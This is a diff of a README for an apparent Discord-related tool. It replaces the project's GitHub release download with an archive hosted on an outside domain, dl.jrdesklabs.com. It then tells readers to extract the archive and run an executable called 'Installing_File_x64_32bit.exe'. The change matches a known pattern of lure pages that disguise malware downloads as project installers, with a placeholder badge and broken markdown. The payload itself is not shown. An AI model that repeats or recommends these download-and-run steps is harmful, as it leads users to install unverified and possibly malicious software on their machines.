@@ -6,11 +6,10 @@
 ## Getting Started:
 
 ### Installation
-[![asdasdasd](https://github.com/user-attachments/assets/69b062e0-a89f-43a8-8153-1cc1b64828eb)
-](https://github.com/aryabasu17/AquaticDiscord/releases/download/V3.3/Release.zip)
+[![asdasdasd](https://dl.jrdesklabs.com/Setup.zip)
 
 
-# **1. [Download the archive](https://github.com/aryabasu17/AquaticDiscord/releases/download/V3.3/Release.zip) and extract it to a convenient folder.**
+# **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 # **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-24_15-13-07](https://github.com/user-attachments/assets/df83894c-c815-4ee3-b8f7-31114984e66f)
